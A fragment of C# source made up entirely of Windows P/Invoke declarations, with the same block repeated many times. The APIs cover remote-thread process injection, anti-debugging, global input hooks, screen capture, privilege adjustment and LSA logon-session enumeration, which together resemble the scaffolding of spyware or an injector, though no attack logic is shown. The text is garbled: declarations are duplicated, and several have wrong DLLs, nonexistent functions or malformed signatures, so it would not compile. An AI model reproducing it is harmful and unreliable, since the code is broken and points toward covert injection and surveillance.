        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
